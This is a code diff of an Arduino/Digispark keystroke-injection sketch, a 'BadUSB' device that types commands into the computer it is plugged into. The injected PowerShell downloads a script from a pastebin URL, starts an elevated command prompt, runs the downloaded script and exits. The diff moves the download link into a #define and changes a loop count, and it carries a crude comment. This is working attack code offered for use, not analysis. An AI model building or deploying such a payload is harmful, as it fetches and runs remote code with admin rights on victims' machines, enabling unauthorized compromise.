@@ -5,6 +5,8 @@
 // comment this shitty ass fucked balls and also the script.ps1 lazy cunt
 #include "DigiKeyboard.h"
 #define KEY_LEFT 0x50
+// CHANGE THE LINK BELOW BEFORE USING
+#define link "https://pastebin.com/raw/e7QyYRh7"
 void setup() {
   pinMode(1, OUTPUT); // LED Setup
 }
@@ -22,7 +24,7 @@ void loop() {
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
   // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
-  DigiKeyboard.println("$client.DownloadFile(\"https://pastebin.com/raw/e7QyYRh7\", $path)");
+  DigiKeyboard.println("$client.DownloadFile(\""link"\", $path)");
   DigiKeyboard.delay(4000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
@@ -36,7 +38,7 @@ void loop() {
 
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
 
-  for (int i = 0; i < 3; i++)
+  for (int i = 0; i < 2; i++)
   {
     DigiKeyboard.delay(4000);
     DigiKeyboard.println("exit");
